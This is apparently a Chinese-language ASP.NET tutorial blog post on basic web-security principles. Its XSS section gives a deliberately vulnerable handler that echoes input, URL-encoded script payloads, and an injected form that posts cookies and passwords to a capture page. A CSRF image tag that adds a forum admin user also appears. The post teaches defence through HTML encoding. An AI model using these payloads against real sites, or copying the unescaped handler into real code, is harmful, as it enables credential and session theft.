---
title: Software Development DotNet ASP.NET - 11、Web开发的一些基本原则2
date: 2013-01-08 11:45:45
categories:
- Software Development
tags:
- Software Development
- ASP.NET
- DotNet
---

###### 2、能再浏览器端完成的事，就不要到服务端去做。

- 按钮隐藏控件，应在客户端操作DOM实现

  ```html
  <input type="button" value="删除"  onclick="document.getElementById('form1').style.display='none'"  />
  ```

- 访问数据库应在服务端完成。

- 对于<asp:Button 来讲，onClick是服务端事件，onClientClick是最终生成到客户端浏览器的onClick。

###### 3、客户端验证不能代替服务端验证。

- 客户端校验是为了很好的客户体验，服务端校验是最后一次把关，防止恶意请求。

###### 4、不要把敏感数据，算法写在浏览器端

- 服务器端控件的Visable=false，是真的未画出到浏览器，此时若和JQuery结合，是无法用$("’’).Show()，因为Visable=False的控件，根部不在HTML中。

###### 5、不要轻信用户提交上来的数据（XSS漏洞）

- Cross-Site-Scripting跨站提交。

- 新建msg.ashx，写入如下代码

  ```csharp
  context.Response.ContentType = "text/html";
  string msg = context.Request.Params[0];
  context.Response.Write(msg);
  ```

- 将如下代码进行URL编码

  ```html
  <script type='text/javascript'>alert('中行庆典。')</script>
  ```

- 编码后

- ```html
  %3Cscript%20type%3D%27text/javascript%27%3Ealert%28%27%u4E2D%u884C%u5E86%u5178%u3002%27%29%3C/script%3E
  ```

- 执行如下代码

  ```html
  http://localhost:1968/WebSite2/msg.ashx?name=%3Cscript%20type%3D%27text/javascript%27%3Ealert%28%27%u4E2D%u884C%u5E86%u5178%u3002%27%29%3C/script%3E
  ```

- [![复制代码](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0);)

  ```HTML
  <form id="form1" action="http://localhost:1968/WebSite2/Default.aspx" method="post"><input type="hidden" id="cookie" name="cookie" /><input type="text" name="accountnum" />密码<input type="password" name="psd" /><input type="button" value="登陆" onclick="document.getElementById('cookie').value=document.cookie;document.getElementById('form1').submit()"/></form>
  ```

  ```html
  %3Cform%20id%3D%22form1%22%20action%3D%22http%3A//localhost%3A1968/WebSite2/Default.aspx%22%20method%3D%22post%22%3E%3Cinput%20type%3D%22hidden%22%20id%3D%22cookie%22%20name%3D%22cookie%22%20/%3E%3Cinput%20type%3D%22text%22%20name%3D%22accountnum%22%20/%3E%u5BC6%u7801%3Cinput%20type%3D%22password%22%20name%3D%22psd%22%20/%3E%3Cinput%20type%3D%22button%22%20value%3D%22%u767B%u9646%22%20onclick%3D%22document.getElementById%28%27cookie%27%29.value%3Ddocument.cookie%3Bdocument.getElementById%28%27form1%27%29.submit%28%29%22/%3E%3C/form%3E
  ```

  ```
  http://localhost:1968/WebSite2/msg.ashx?name

  string msg = "";
  if (Request["accountnum"] != null)
  {
      msg +="<br/>账户："+ Request["accountnum"].ToString();
  }

  if(Request["psd"] != null)
  {
      msg +="<br/>密码："+ Request["psd"].ToString();
  }

  if (Request["cookie"] != null)
  {
      msg +="<br/>Cookie："+ Request["cookie"].ToString();
  }

  Context.Response.Write(msg);
  ```

  ​

###### 6、传入的参数直接画在页面上了

###### 7、新闻允许用户评论

- 回复<img src="[http://www.dvbbs.com/admin/admin_add.asp?user=xxx&psd=yyy"/](http://www.dvbbs.com/admin/admin_add.asp?user=xxx&psd=yyy%22/)>，引诱管理员看此帖子，若使用共享内存的浏览器，管理员就后台添加了一个用户

###### 8、在可能含有HTML内容时，

- 应使用Literal，将 Mode设为Encode，Text=<a href="..."/>将不再变为超链接。

- ValidateRequest=Fales，可关闭安全检查。

- 使用如下代码，可将“<，>，”等转换为转义符。

  ```csharp
  Response.Write(HttpUtility.HtmlEncode(s));
  ```